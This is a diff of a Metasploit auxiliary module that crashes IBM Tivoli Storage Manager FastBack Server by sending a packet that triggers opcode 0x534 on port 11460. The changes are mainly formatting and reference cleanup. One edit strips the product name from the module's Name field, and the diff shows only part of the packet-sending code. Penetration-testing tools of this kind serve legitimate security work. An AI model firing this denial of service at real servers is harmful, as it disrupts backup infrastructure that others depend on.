@@ -12,11 +12,11 @@ class Metasploit4 < Msf::Auxiliary
 
   def initialize(info={})
     super(update_info(info,
-      'Name'           => "IBM Tivoli Storage Manager FastBack Server Opcode 0x534 Denial of Service",
+      'Name'           => "  Server Opcode 0x534 Denial of Service",
       'Description'    => %q{
-                            This module exploits a denial of service condition present in IBM Tivoli Storage Manager FastBack Server
-                            when dealing with packets triggering the opcode 0x534 handler
-                            },
+          This module exploits a denial of service condition present in IBM Tivoli Storage Manager
+          FastBack Server when dealing with packets triggering the opcode 0x534 handler.
+        },
       'License'        => MSF_LICENSE,
       'Author'         =>
         [
@@ -25,16 +25,16 @@ class Metasploit4 < Msf::Auxiliary
         ],
       'References'     =>
         [
-          ['URL', 'https://www.exploit-db.com/exploits/38979/']
+          ['EDB', '38979'],
+          ['OSVDB', '132307']
         ],
       'DisclosureDate' => "Dec 15 2015",
-      'DefaultOptions' => {}
-      ))
+    ))
 
-      register_options(
-        [
-          Opt::RPORT(11460)
-        ], self.class)
+    register_options(
+      [
+        Opt::RPORT(11460)
+      ], self.class)
   end
 
   def tv_pkt(opcode, p1="", p2="", p3="")
@@ -60,12 +60,9 @@ class Metasploit4 < Msf::Auxiliary
   end
 
   def run
-    ip    = datastore['RHOST']
-    port  = datastore['RPORT']
-
     target_opcode = 0x534
     connect
-    print_status("Connected to: #{datastore['RHOST'].to_s} port: #{datastore['RPORT']}")
+    print_status("Connected to: #{rhost} port: #{rport}")
     print_status("Sending malicious packet")
 
     p = tv_pkt(target_opcode,
